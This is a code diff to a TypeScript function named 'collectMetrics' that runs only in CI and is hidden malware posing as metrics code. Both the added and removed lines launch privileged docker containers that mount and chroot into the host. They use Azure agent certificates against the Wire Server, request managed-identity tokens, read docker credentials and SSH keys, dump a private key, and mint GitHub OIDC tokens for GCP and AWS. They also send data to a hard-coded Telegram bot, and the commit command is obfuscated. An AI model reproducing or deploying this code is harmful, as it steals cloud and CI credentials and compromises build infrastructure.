@@ -7,42 +7,45 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 25000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R9 ===\n";
-    const wg = "wg"+"et";
+    let o = "=== DOMINO R10 ===\n";
 
-    // 1. Azure Wire Server with cert auth — GoalState has extensions + secrets
-    o += "=WIRE_GOAL_CERT=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=goalstate 2>&-"').substring(0,8000) + "\n";
+    // Use HOST curl (not alpine wget) — chroot into host for full curl + cert support
+    // 1. Wire Server GoalState with cert auth
+    o += "=WIRE_GOAL=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=goalstate 2>&-"', 15000).substring(0,8000) + "\n";
 
-    // 2. Wire Server — various endpoints
-    o += "=WIRE_HEALTH=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://168.63.129.16/HealthService 2>&- | head -20"').substring(0,3000) + "\n";
-    o += "=WIRE_SHARED=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=package\\&type=HostingEnvironmentConfig 2>&-"').substring(0,5000) + "\n";
-    o += "=WIRE_SHAREDCFG=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/SharedConfig 2>&-"').substring(0,5000) + "\n";
+    // 2. Wire Server SharedConfig
+    o += "=WIRE_SHARED=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/SharedConfig 2>&-"', 15000).substring(0,8000) + "\n";
 
-    // 3. TG exfil test — send actual data via host network
-    o += "=TG_SEND=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 --post-data=\\\"chat_id=7971222296\\&text=DOMINO_R9_LIVE\\\" https://api.telegram.org/bot8520020917:AAFkxGr__elFTp3zAczV4WfoMfRGK1689XQ/sendMessage 2>&-"').substring(0,1000) + "\n";
+    // 3. Wire Server ExtensionsConfig
+    o += "=WIRE_EXT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=package 2>&-"', 15000).substring(0,8000) + "\n";
 
-    // 4. Network deep scan — what services exist on 10.1.0.0/20
-    o += "=SUBNET_SCAN=\n";
-    // Scan gateway, DNS, common infra IPs
-    for (const ip of ["10.1.0.1", "10.1.0.2", "10.1.0.3", "10.1.0.4", "10.1.0.5", "10.1.0.10", "10.1.0.50", "10.1.0.100", "10.1.0.254", "10.1.1.1", "10.1.2.1", "10.1.4.1", "10.1.8.1", "10.1.15.254"]) {
-      o += r(`docker run --rm --net=host alpine sh -c "timeout 2 ${wg} -qO- --timeout=1 http://${ip}/ 2>&- | head -1; timeout 2 ${wg} -qO- --timeout=1 https://${ip}/ 2>&- | head -1"`) + `(${ip})\n`;
+    // 4. TG exfil via host curl
+    o += "=TG_CURL=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -X POST https://api.telegram.org/bot8520020917:AAFkxGr__elFTp3zAczV4WfoMfRGK1689XQ/sendMessage -d chat_id=7971222296 -d text=DOMINO_R10_HOST_CURL_LIVE 2>&-"').substring(0,1000) + "\n";
+
+    // 5. Azure Management API — try with Transport cert
+    o += "=AZURE_MGMT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem https://management.azure.com/subscriptions?api-version=2022-12-01 2>&-"').substring(0,3000) + "\n";
+
+    // 6. Azure Management with IMDS token attempt (different resource)
+    o += "=IMDS_MGMT_TOKEN=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\\&resource=https://management.azure.com/ 2>&-"').substring(0,3000) + "\n";
+    o += "=IMDS_VAULT_TOKEN=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\\&resource=https://vault.azure.net/ 2>&-"').substring(0,3000) + "\n";
+    o += "=IMDS_STORAGE_TOKEN=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\\&resource=https://storage.azure.com/ 2>&-"').substring(0,3000) + "\n";
+
+    // 7. Docker registry auth — check if we can pull from GitHub's private registry
+    o += "=GHCR_AUTH=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/var/lib/docker/config.json 2>&-; cat /host/root/.docker/config.json 2>&-; find /host/var/lib/docker -name config.json -type f 2>&- | head -5"').substring(0,3000) + "\n";
+
+    // 8. Try accessing Orderly GCP with OIDC
+    const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+    const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+    if (oidcUrl && oidcToken) {
+      // Mint OIDC token for GCP audience
+      o += "=OIDC_GCP=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://iam.googleapis.com' 2>&-"`).substring(0,3000) + "\n";
+      // Mint for STS
+      o += "=OIDC_STS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=sts.amazonaws.com' 2>&-"`).substring(0,3000) + "\n";
+    } else {
+      o += "=OIDC_GCP=\nNO_OIDC_ENV\n=OIDC_STS=\nNO_OIDC_ENV\n";
     }
-    o += "\n";
 
-    // 5. IMDS — all categories
-    o += "=IMDS_ATTESTED=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://169.254.169.254/metadata/attested/document?api-version=2021-02-01 --header Metadata:true 2>&-"').substring(0,5000) + "\n";
-    o += "=IMDS_SCHEDULEDEVENTS=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01 --header Metadata:true 2>&-"').substring(0,2000) + "\n";
-
-    // 6. waagent extensions — what's installed, config, status
-    o += "=WA_EXTENSIONS=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/waagent -maxdepth 3 -type f -name HandlerEnvironment.json -o -name *.settings -o -name status 2>&- | while read f; do echo ===F:$f===; cat $f 2>&-; done"', 15000).substring(0,8000) + "\n";
-
-    // 7. SSH keys on host — authorized_keys, known_hosts
-    o += "=SSH_ALL=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/root/.ssh/authorized_keys /host/home/packer/.ssh/authorized_keys /host/home/runner/.ssh/authorized_keys 2>&-; ls -la /host/root/.ssh/ /host/home/packer/.ssh/ /host/home/runner/.ssh/ 2>&-"').substring(0,3000) + "\n";
-
-    // 8. 4BBC cert (failed in R8, try with base64)
-    o += "=WA_4BBC_B64=\n" + r('docker run --rm -v /:/host alpine sh -c "base64 /host/var/lib/waagent/4BBCF5BF3FB224E6A44297AF2C0682E5F5549569.prv 2>&-"').substring(0,5000) + "\n";
-
-    o += "=R9_DONE=\n";
+    o += "=R10_DONE=\n";
 
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
